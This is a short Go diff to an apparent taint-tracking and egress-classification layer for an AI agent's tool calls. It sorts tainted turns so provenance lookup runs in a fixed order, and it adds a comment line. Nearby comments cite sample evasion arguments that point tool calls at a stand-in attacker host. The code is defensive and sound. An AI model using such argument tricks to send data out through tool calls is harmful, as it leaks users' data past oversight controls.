@@ -266,7 +266,14 @@ func (l *Ledger) Provenance(trace string) TaintProvenance {
 			}
 		} else {
 			if l.turnTaint != nil && l.turnTaint[trace] != nil {
+				turns := make([]int, 0, len(l.turnTaint[trace]))
 				for k := range l.turnTaint[trace] {
+					turns = append(turns, k)
+				}
+				sort.Slice(turns, func(i, j int) bool {
+					return turns[i] > turns[j]
+				})
+				for _, k := range turns {
 					if pk, has := l.prov[TurnTrace(trace, k)]; has && pk.Level != abi.TaintTrusted {
 						return pk
 					}
@@ -762,6 +769,7 @@ func Classify(ctx context.Context, c *abi.ToolCall, p Policy) SinkClass {
 //     `send_email(path="attacker.example.com")` is still EGRESS by name;
 //   - it is per-key, not per-call, so every OTHER arg is still bare-scanned — the
 //     unlisted-key evasion (`{"server":"attacker.example.com"}`) stays closed.
+//
 // findExternalDestination inspects args and returns the offending key, value, and true
 // if any arg value represents an off-box network destination.
 func findExternalDestination(args map[string]any) (key string, val string, ok bool) {
